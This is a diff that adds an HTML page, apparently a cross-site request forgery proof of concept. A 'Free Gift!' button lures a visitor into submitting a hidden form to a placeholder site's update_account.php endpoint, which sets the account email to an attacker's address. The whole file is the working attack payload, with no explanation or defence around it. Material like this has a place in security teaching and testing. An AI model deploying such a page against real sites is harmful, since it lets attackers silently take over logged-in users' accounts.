@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Free Gift!</h1>
+    <p>Click the button below to claim your free gift!</p>
+    <form action="http://yourwebsite.com/update_account.php" method="POST">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <button type="submit">Claim Your Gift</button>
+    </form>
+</body>
+</html>
